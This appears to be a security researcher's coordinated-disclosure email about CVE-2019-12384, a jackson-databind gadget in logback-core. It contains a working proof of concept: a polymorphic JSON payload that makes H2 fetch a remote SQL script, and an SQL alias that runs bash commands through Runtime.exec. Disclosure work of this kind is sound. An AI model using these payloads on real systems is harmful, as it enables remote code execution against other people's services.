During a penetration test at Doyensec I (Andrea Brancaleoni) found a new gadget
for **jackson-databind** in *logback-core*. Since we succeeded in escalating it
to remote code execution and considered the widespread usage of the library we
applied for a CVE. Mitre pre-assigned the number CVE-2019-12384.

An attacker that can inject a polymorphic JSON object (see `inject.json`) to a
specific endpoint, given the presence of logback-core and h2 database in the
class-path, could potentially trigger a remote code execution.

```inject.json
[“ch.qos.logback.core.db.DriverManagerConnectionSource”, {“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://localhost:8000/inject.sql’”}]
```
```inject.sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {“bash”, “-c”, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(“\\A”); return s.hasNext() ? s.next() : “”;  }$$;
CALL SHELLEXEC(‘id > exploited.txt’)
```

At Doyensec we follow a Coordinated Disclosure Policy, with a 90-day disclosure
deadline. If this email fail to be answered we may issue a public advisory
afterwards.

<sales pitch>If you’re looking for an independent vendor to perform security testing or to develop security automation solutions, let us know! </sales pitch>

Cheers,
  Andrea Brancaleoni @ Doyensec
  
